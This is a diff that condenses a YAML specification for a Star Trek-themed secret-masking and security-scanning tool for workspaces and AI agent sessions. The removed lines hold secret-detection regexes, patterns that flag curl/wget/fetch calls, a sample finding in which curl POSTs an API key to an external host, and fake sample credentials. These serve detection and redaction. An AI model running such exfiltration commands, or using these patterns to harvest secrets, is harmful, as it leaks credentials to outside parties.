-      - "Tokens: bearer *, jwt=*, token="
-      - "Private keys: -----BEGIN.*PRIVATE KEY-----"
-      - "Connection strings: postgres://, mysql://, mongodb://"
-    commands:
-      - "cursor-mirror tgrep 'sk-[a-zA-Z0-9]{20,}'"
-      - "cursor-mirror tgrep 'AKIA[A-Z0-9]{16}'"
-      - "cursor-mirror tgrep 'password[=:]'"
-      - "cursor-mirror tgrep 'BEGIN.*PRIVATE KEY'"
+    hunts: [api_keys, passwords, tokens, private_keys, connection_strings]
 
   PROBE-INFRASTRUCTURE:
-    description: "Hunt for internal infrastructure details"
+    description: "Hunt for internal infrastructure"
     composes_with: cursor-mirror
-    parameters:
-      composer:
-        type: string
-    patterns:
-      - "Internal hostnames: *.internal, *.local, *.corp"
-      - "Private IPs: 10.*, 192.168.*, 172.16-31.*"
-      - "Cloud resources: arn:aws:*, projects/*/locations/*"
-      - "Non-standard ports in URLs"
-    commands:
-      - "cursor-mirror tgrep '\\.internal|\\.local|\\.corp'"
-      - "cursor-mirror tgrep '10\\.[0-9]+\\.[0-9]+\\.[0-9]+'"
-      - "cursor-mirror tgrep 'arn:aws:'"
+    hunts: [hostnames, private_ips, cloud_resources]
 
   PROBE-PROPRIETARY:
-    description: "Hunt for proprietary/internal terms"
+    description: "Hunt for proprietary terms"
     composes_with: cursor-mirror
-    parameters:
-      composer:
-        type: string
-      terms_file:
-        type: string
-        default: ".moollm/trekify/proprietary-terms.txt"
-        description: "File with proprietary terms to hunt"
-    note: |
-      Create .moollm/trekify/proprietary-terms.txt with your
-      internal product names, project codenames, customer
-      identifiers — one per line.
+    source: ".moollm/trekify/proprietary-terms.txt"
 
   PROBE-CONTEXT:
-    description: "Hunt for sensitive contexts using LLM understanding"
+    description: "Hunt for sensitive contexts via LLM"
     composes_with: cursor-mirror
-    parameters:
-      composer:
-        type: string
-      contexts:
-        type: array
-        default:
-          - security_vulnerabilities
-          - incident_response
-          - hr_personnel
-          - financial_data
-          - legal_compliance
-    approach: |
-      Uses LLM semantic understanding, not just regex.
-      "This looks like an incident response discussion" →
-      flag entire section for review, not just keywords.
+    contexts: [security, incidents, hr, financial, legal]
 
   PROBE-AND-MASK:
-    description: "Run probes and auto-mask all findings"
+    description: "Probe + auto-mask findings"
     composes_with: cursor-mirror
-    parameters:
-      composer:
-        type: string
-      output_path:
-        type: string
-      probes:
-        type: array
-        default: [all]
-      review_before_mask:
-        type: boolean
-        default: true
-        description: "Show findings for approval before masking"
-    returns:
-      findings: array
-      masked_path: string
-      substitutions: array
-    workflow:
-      - "1. Run all requested probes"
-      - "2. Aggregate findings"
-      - "3. If review_before_mask: show findings, await approval"
-      - "4. Apply MASK-SESSION with all findings"
-      - "5. Return masked output"
+    parameters: {composer: string, output_path: string}
 
-  # WORKSPACE SCANNERS — Long Range, Short Range, Tricorder
-
+  # Workspace Scanners
   LONG-RANGE-SCAN:
     description: "Scan entire workspace for sensitive patterns"
-    metaphor: "Captain, long range sensors detecting quantum signatures throughout the sector!"
-    parameters:
-      workspace:
-        type: string
-        default: "."
-        description: "Workspace root to scan"
-      categories:
-        type: array
-        items: string
-        enum: [secrets, infrastructure, proprietary, people, all]
-        default: [secrets]
-      exclude:
-        type: array
-        default: ["node_modules", ".git", "vendor", "*.lock"]
-      output:
-        type: string
-        enum: [summary, detailed, json]
-        default: summary
-    returns:
-      total_files_scanned: int
-      findings_by_category: object
-      high_risk_files: array
-      recommendations: array
-    commands_used:
-      - "rg -i 'password[=:]' --type-add 'config:*.{yml,yaml,json,env}' -t config"
-      - "rg 'sk-[a-zA-Z0-9]{20,}' ."
-      - "rg 'AKIA[A-Z0-9]{16}' ."
-      - "rg 'BEGIN.*PRIVATE KEY' ."
-    example: |
-      trekify LONG-RANGE-SCAN --categories secrets,infrastructure
-      
-      # Output:
-      # LONG RANGE SCAN COMPLETE
-      # ========================
-      # Files scanned: 1,247
-      # Sectors analyzed: 23 directories
-      # 
-      # QUANTUM SIGNATURES DETECTED:
-      # - [CRITICAL] config/prod.env: 3 credential patterns
-      # - [HIGH] scripts/deploy.sh: hardcoded API key
-      # - [MEDIUM] docs/setup.md: example with real-looking password
-      #
-      # Recommendation: Run TRICORDER on high-risk files
+    metaphor: "Long range sensors detecting quantum signatures!"
+    uses: ripgrep
+    parameters: {workspace: string, categories: array}
+    returns: {findings_by_category: object, high_risk_files: array}
 
   SHORT-RANGE-SCAN:
-    description: "Focused scan on specific directory or file type"
-    metaphor: "Short range sensors show elevated readings in Section 7!"
-    parameters:
-      target:
-        type: string
-        description: "Directory or glob pattern to scan"
-      focus:
-        type: string
-        enum: [config, source, docs, scripts, all]
-        default: all
-        description: "Type of files to focus on"
-      depth:
-        type: integer
-        default: -1
-        description: "Directory depth (-1 for unlimited)"
-    returns:
-      files_scanned: int
-      findings: array
-      risk_assessment: string
-    example: |
-      trekify SHORT-RANGE-SCAN config/ --focus config
-      
-      # Output:
-      # SHORT RANGE SCAN: config/
-      # =========================
-      # Files: 12 configuration files
-      # 
-      # FINDINGS:
-      # - config/database.yml:23 — connection string with password
-      # - config/secrets.yml:7 — API key (appears to be example)
-      # - config/.env.production:* — CRITICAL: 5 live credentials
+    description: "Focused scan on directory or file type"
+    metaphor: "Elevated readings in Section 7!"
+    parameters: {target: string, focus: enum}
+    focus_modes: [config, source, docs, scripts, all]
 
   TRICORDER:
-    description: "Detailed analysis of specific file or pattern"
-    metaphor: "Tricorder readings indicate multiple credential signatures, Captain."
-    parameters:
-      target:
-        type: string
-        description: "File path or pattern to analyze"
-      mode:
-        type: string
-        enum: [file, pattern, trace, semantic]
-        default: file
-      include_git_history:
-        type: boolean
-        default: true
-        description: "Check when pattern was introduced (git blame)"
-      suggest_replacements:
-        type: boolean
-        default: true
-        description: "Suggest TREKIFY replacements"
-    returns:
-      analysis:
-        purpose: string
-        risk_level: string
-        findings: array
-        context: string
-      history:
-        introduced_by: string
-        commit: string
-        date: string
-      replacements:
-        suggested: array
-        auto_maskable: boolean
-    example: |
-      trekify TRICORDER config/prod.env
-      
-      # TRICORDER ANALYSIS: config/prod.env
-      # ====================================
-      # Purpose: Production environment configuration
-      # Risk Level: CRITICAL
-      # 
-      # LINE-BY-LINE ANALYSIS:
-      # 
-      # Line 3: DATABASE_URL=postgres://admin:s3cr3t@prod-db:5432/app
-      #   [CRITICAL] Connection string with embedded password
-      #   Introduced: commit a1b2c3d by j.smith, 2024-01-15
-      #   Suggested: Memory Core uplink via biometric phase harmonics
-      #   
-      # Line 7: API_KEY=sk-live-abc123def456
-      #   [CRITICAL] Live API key
-      #   Introduced: commit e4f5g6h by j.smith, 2024-01-15
-      #   Suggested: quantum entanglement token (Tier 3 clearance)
-      #
-      # RECOMMENDATION: This file should be in .gitignore!
-      # Run: trekify MASK-FILE config/prod.env
+    description: "Detailed analysis of specific file"
+    metaphor: "Tricorder readings indicate credential signatures!"
+    parameters: {target: string, mode: enum, include_git_history: bool}
+    returns: {analysis: object, history: object, suggested_replacements: array}
 
   SCAN-AND-REPORT:
-    description: "Full workspace scan with detailed report"
-    metaphor: "All hands, initiating full sensor sweep of the sector."
-    parameters:
-      workspace:
-        type: string
-        default: "."
-      report_format:
-        type: string
-        enum: [markdown, json, html]
-        default: markdown
-      output_path:
-        type: string
-        description: "Where to save the report"
-      include_recommendations:
-        type: boolean
-        default: true
-    returns:
-      report_path: string
-      summary:
-        files_scanned: int
-        issues_found: int
-        critical: int
-        high: int
-        medium: int
-        low: int
-    example: |
-      trekify SCAN-AND-REPORT --report-format markdown -o security-report.md
-      
-      # Generates comprehensive report with:
-      # - Executive summary
-      # - Findings by severity
-      # - File-by-file analysis
-      # - Recommended actions
-      # - Auto-mask commands
+    description: "Full scan with comprehensive report"
+    metaphor: "Full sensor sweep of the sector."
+    parameters: {workspace: string, report_format: enum, output_path: string}
 
-  # EXFILTRATION ANALYSIS
-
+  # Exfiltration Analysis
   EXFILTRATION-SCAN:
-    description: "Detect potential data exfiltration in tool calls"
-    metaphor: "Captain, sensors detecting unauthorized subspace transmissions!"
+    description: "Detect data leaving via tool calls"
+    metaphor: "Unauthorized subspace transmissions!"
     composes_with: cursor-mirror
-    parameters:
-      composer:
-        type: string
-        description: "Session to analyze"
-      categories:
-        type: array
-        items: string
-        enum: [network, api, file, clipboard, environment, logging, database, email, all]
-        default: [all]
-      include_context:
-        type: boolean
-        default: true
-        description: "Show surrounding context for findings"
-    returns:
-      transmissions_detected: int
-      findings: array  # [{category, tool, args, risk_level, context, line}]
-      risk_assessment: string
-      recommendations: array
-    commands_used:
-      - "cursor-mirror tools <id> | grep -i 'curl\\|wget\\|fetch'"
-      - "cursor-mirror tools <id> | grep -i 'password\\|secret\\|key'"
-      - "cursor-mirror tools <id> -f json | jq 'select(.args | contains(\"http\"))'"
-    example: |
-      trekify EXFILTRATION-SCAN e8587ace
-      
-      # EXFILTRATION ANALYSIS
-      # =====================
-      # Session: e8587ace
-      # Subspace transmissions detected: 3
-      #
-      # [CRITICAL] Tool: Shell, Line 423
-      #   Command: curl -X POST https://api.external.com -d "key=$API_KEY"
-      #   Risk: Credentials sent to external server
-      #   Context: "Sending webhook notification..."
-      #
-      # [HIGH] Tool: Write, Line 156
-      #   Path: /tmp/debug-output.txt
-      #   Content contains: password=...
-      #   Risk: Secrets written to world-readable location
-      #
-      # [MEDIUM] Tool: Shell, Line 89
-      #   Command: echo $DATABASE_URL
-      #   Risk: Connection string exposed in terminal
-      #
-      # RISK ASSESSMENT: HIGH
-      # Recommendations:
-      # - Review curl command at line 423
-      # - Remove /tmp/debug-output.txt
-      # - Use secret manager instead of env vars
+    parameters: {composer: string, categories: array}
+    detects: [network, api, file, clipboard, environment, logging]
 
   EXFILTRATION-WATCH:
-    description: "Real-time monitoring for exfiltration patterns"
-    metaphor: "Red alert! Continuous sensor sweep for unauthorized transmissions."
-    parameters:
-      watch_mode:
-        type: string
-        enum: [active_session, all_sessions, workspace]
-        default: active_session
-      alert_level:
-        type: string
-        enum: [critical_only, high_and_above, all]
-        default: high_and_above
-      action_on_detect:
-        type: string
-        enum: [log, warn, block]
-        default: warn
-    note: |
-      In "block" mode, TREKIFY will attempt to intercept and
-      mask sensitive data before it leaves. Use with caution.
+    description: "Real-time monitoring for exfiltration"
+    metaphor: "Red alert! Continuous sensor sweep."
+    parameters: {watch_mode: enum, alert_level: enum, action_on_detect: enum}
 
   TOOL-AUDIT:
-    description: "Audit all tool calls in a session for security"
+    description: "Audit tool calls for security"
     composes_with: cursor-mirror
-    parameters:
-      composer:
-        type: string
-      tools:
-        type: array
-        items: string
-        enum: [Shell, Write, Read, browser_navigate, all]
-        default: [all]
-      severity_threshold:
-        type: string
-        enum: [low, medium, high, critical]
-        default: medium
-    returns:
-      tools_analyzed: int
-      findings_by_tool: object
-      risk_score: string
-      timeline: array  # Chronological view of risky operations
-    example: |
-      trekify TOOL-AUDIT e8587ace --tools Shell,Write
-      
-      # TOOL AUDIT REPORT
-      # =================
-      # 
-      # Shell commands: 47 total, 5 flagged
-      # Write operations: 23 total, 2 flagged
-      #
-      # TIMELINE OF RISKY OPERATIONS:
-      # 14:23:05 [HIGH] Shell: curl with embedded credential
-      # 14:24:12 [MEDIUM] Write: /tmp/debug.log with password
-      # 14:25:33 [HIGH] Shell: export SECRET_KEY=...
-      # 14:26:01 [MEDIUM] Write: config.json with API key
-      # 14:27:45 [CRITICAL] Shell: scp to external server
+    parameters: {composer: string, tools: array}
+    returns: {timeline: array, risk_score: string}
 
-# WORKFLOW
+# WORKFLOWS
 
-workflow:
-  before_commit:
-    description: "Mask sensitive data before committing to public repo"
-    steps:
-      - "SCAN staged files for sensitive data"
-      - "Review findings and adjust sensitivity"
-      - "MASK-FILE for each file needing redaction"
-      - "Commit masked versions"
-      - "Store substitution keys securely (NOT in repo)"
-  
-  before_sharing_session:
-    description: "Mask cursor-mirror transcript before sharing"
-    steps:
-      - "cursor-mirror agent-transcript <id> > raw.txt"
-      - "trekify MASK-SESSION → masked.txt"
-      - "Review masked output"
-      - "Share masked version"
-  
-  in_commit_messages:
-    description: "Use TREKIFY style in thoughtful-commitment"
-    example: |
-      # Instead of:
-      fix: Update AWS credentials for prod-payments service
-      
-      # Write:
-      fix: Recalibrate quantum authentication at Utopia Planitia
-      
-      The isolinear encryption sequence for the payment processing
-      matrix approached temporal decay threshold. Rotated quantum
-      harmonics and updated the orchestration manifest in Sector 001.
+workflows:
+  before_commit: "SCAN → MASK-FILE → commit masked → store key securely"
+  before_sharing: "cursor-mirror transcript → MASK-SESSION → review → share"
+  full_audit: "LONG-RANGE-SCAN → TRICORDER high-risk → PROBE-AND-MASK sessions"
 
-# EXAMPLES
+# ADVERTISEMENTS
 
-examples:
-  
-  connection_string:
-    before: "postgresql://admin:secretpass@prod-db.company.com:5432/userdata"
-    after: "Memory Core uplink via biometric phase harmonics to Starbase 47, docking frequency 54, userdata archive"
-  
-  log_entry:
-    before: |
-      2024-01-15 10:23:45 ERROR Failed to connect to api-server-3.internal
-      Auth token expired for user john.smith@company.com
-      Retrying with new credentials from AWS Secrets Manager
-    after: |
-      Stardate 2024.015 1023 ALERT Uplink failure to Starbase 3
-      Subspace authentication matrix expired for Lieutenant Smith
-      Reinitializing quantum relay via Utopia Planitia credential vault
-  
-  commit_message:
-    before: |
-      fix: Rotate API keys after security audit
-      
-      The penetration test found our Stripe keys were exposed in
-      the staging environment. Rotated all keys and updated the
-      Kubernetes secrets in us-east-1 and eu-west-1.
-    after: |
-      fix: Rotate quantum entanglement tokens after security diagnostic
-      
-      Level-4 security sweep detected credential exposure in the
-      holodeck test matrix. Refreshed all authentication harmonics
-      and updated orchestration manifests in Sectors 001 and 012.
+advertisements:
+  MASK:
+    score: 100
+    condition: "Need to mask sensitive data for sharing"
+  PROBE:
+    score: 100
+    condition: "Hunt for secrets in session history"
+  LONG-RANGE-SCAN:
+    score: 90
+    condition: "Security audit of workspace"
+  EXFILTRATION-SCAN:
+    score: 95
+    condition: "Check if data might have leaked"
 
-# GEORDI SAYS
-
-geordi_says: |
-  "Captain, I've completed the privacy diagnostic. All sensitive data
-  has been routed through the technobabble filters. The quantum
-  signatures are masked but readable, and the narrative flow is
-  maintained. We're ready to share the logs with external teams.
-  
-  The substitution key is stored in the secure isolinear vault —
-  we can reverse the process if needed for internal review.
-  
-  Estimated time to full disclosure: whenever you give the order, sir."
+invoke_when:
+  - "Sharing session transcripts"
+  - "Committing to public repos"
+  - "Security audit needed"
+  - "Before publishing logs or docs"
+  - "Checking for leaked credentials"
